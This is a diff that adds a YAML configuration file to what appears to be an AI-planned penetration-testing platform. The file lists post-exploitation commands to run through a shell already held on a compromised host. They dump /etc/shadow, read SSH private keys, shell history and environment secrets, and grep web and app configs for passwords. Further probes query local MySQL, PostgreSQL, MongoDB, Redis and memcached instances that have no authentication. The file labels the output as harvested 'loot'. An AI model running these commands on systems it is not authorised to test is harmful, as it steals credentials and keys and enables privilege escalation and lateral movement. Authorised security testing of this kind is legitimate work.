@@ -1,0 +1,91 @@
+# What the platform runs THROUGH a held shell — as data, not lists in code.
+#
+# WHY THIS IS DATA
+#   Post-exploitation enumeration ran a fixed Python list (_POSTEX_INFO_COMMANDS)
+#   and a fixed dict of per-service database probes (_LOCAL_DB_PROBES) baked into
+#   autogen_agents/langgraph_engine.py. Adding "also check X on a foothold" or
+#   "enumerate this other local database" meant editing code. These are the same
+#   kind of domain knowledge as the enumeration rules — "what is worth looking at
+#   once you are on the box" — so they live here, editable without a code change,
+#   and embedded into RAG (etl/load_knowledge_documents.py) so the planner can
+#   retrieve them too.
+#
+# READ-ONLY BY CONTRACT
+#   Everything here is enumeration: it gathers information through access already
+#   held. NOTHING here mutates the target (no persistence, no new accounts) — a
+#   root-only read (e.g. /etc/shadow) simply returns nothing on a user shell.
+#   The harvested output is fed to knowledge/enumeration_extractors.yaml, so a
+#   secret or key printed by one of these commands becomes a fact and can fire a
+#   rule.
+#
+# STEP IDS ARE LOAD-BEARING
+#   `id` is how later steps find a command's output. _harvest_shell_loot reads
+#   the output of the step whose id is `shadow`; do not rename it. Ids must be
+#   unique within `info_commands`.
+
+version: 1
+
+# Baseline info-gathering run once through the BEST shell, in payoff order:
+# identity -> privesc surface -> secrets / pivot data. Kind-agnostic (a bind /
+# command / meterpreter shell benefits, not only ssh).
+info_commands:
+  - {id: id,               title: "Current identity & groups",     command: "id"}
+  - {id: uname,            title: "Kernel / OS (privesc surface)", command: "uname -a"}
+  - {id: os_release,       title: "Distro release",                command: "cat /etc/issue /etc/os-release 2>/dev/null"}
+  - {id: whoami_hostname,  title: "Host & user",                   command: "hostname; whoami"}
+  - {id: passwd,           title: "Local users",                   command: "cat /etc/passwd"}
+  - {id: shadow,           title: "Password hashes (root only)",   command: "cat /etc/shadow 2>/dev/null"}
+  - {id: sudo_l,           title: "Sudo rights (no password)",     command: "sudo -n -l 2>/dev/null"}
+  - {id: suid,             title: "SUID binaries (privesc)",       command: "find / -perm -4000 -type f 2>/dev/null"}
+  - {id: caps,             title: "File capabilities (privesc)",   command: "getcap -r / 2>/dev/null"}
+  - {id: crontab,          title: "System cron jobs",              command: "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null"}
+  - {id: listen,           title: "Listening services (pivot targets)", command: "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"}
+  - {id: net,              title: "Network interfaces & routes",   command: "ip a 2>/dev/null || ifconfig -a 2>/dev/null; ip route 2>/dev/null"}
+  - {id: homes,            title: "Home directories",              command: "ls -la /root /home/* 2>/dev/null"}
+  - {id: history,          title: "Shell history (creds/commands)", command: "cat /root/.bash_history /home/*/.bash_history 2>/dev/null"}
+  - {id: ssh_keys,         title: "SSH private keys",              command: "cat /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null"}
+  - {id: env,              title: "Environment (secrets in env)",  command: "env 2>/dev/null"}
+  - {id: db_conf,          title: "Web/app config files (DB creds)",
+     command: "grep -rIl --include=*.php --include=*.conf --include=*.env -e password -e passwd -e secret /var/www /etc 2>/dev/null | head -20"}
+  - {id: procs,            title: "Running processes",             command: "ps aux 2>/dev/null || ps -ef 2>/dev/null"}
+
+# Databases bound to loopback (127.x / ::1) are unreachable from an external
+# scan, but a shell can query them locally (often as root, no password). Run
+# ONLY when the `listen` output shows the service local-only. `ports`/`procs`
+# are how _loopback_db_services detects the service in ss/netstat output.
+local_database_probes:
+  mysql:
+    ports: [3306]
+    procs: [mysql, mariadb]
+    why: "a local MySQL/MariaDB often trusts root with no password from localhost"
+    commands:
+      - {id: db_mysql, title: "Local MySQL/MariaDB databases + users",
+         command: "mysql -u root -N -e 'SELECT version(); SHOW DATABASES; SELECT user,host FROM mysql.user;' 2>&1 | head -80"}
+  postgres:
+    ports: [5432]
+    procs: [postgres, postmaster]
+    why: "a local PostgreSQL often trusts the postgres role over the unix socket"
+    commands:
+      - {id: db_postgres, title: "Local PostgreSQL databases + roles",
+         command: "(psql -U postgres -tAc 'SELECT version()' 2>&1; psql -U postgres -l 2>&1; psql -U postgres -tAc 'SELECT rolname FROM pg_roles' 2>&1) | head -80"}
+  mongodb:
+    ports: [27017]
+    procs: [mongod]
+    why: "a local MongoDB frequently has no authentication bound to localhost"
+    commands:
+      - {id: db_mongo, title: "Local MongoDB databases",
+         command: "mongosh --quiet --eval 'printjson(db.adminCommand({listDatabases:1}))' 2>&1 || mongo --quiet --eval 'printjson(db.adminCommand({listDatabases:1}))' 2>&1 | head -60"}
+  redis:
+    ports: [6379]
+    procs: [redis]
+    why: "a local Redis usually has no auth and exposes keys and server info"
+    commands:
+      - {id: db_redis, title: "Local Redis info + keys",
+         command: "(redis-cli INFO server 2>&1; redis-cli DBSIZE 2>&1; redis-cli --scan 2>&1 | head -20) | head -80"}
+  memcached:
+    ports: [11211]
+    procs: [memcached]
+    why: "a local memcached exposes stats and cached items with no auth"
+    commands:
+      - {id: db_memcached, title: "Local memcached stats",
+         command: "printf 'stats\\r\\nquit\\r\\n' | nc -w1 127.0.0.1 11211 2>&1 | head -40"}
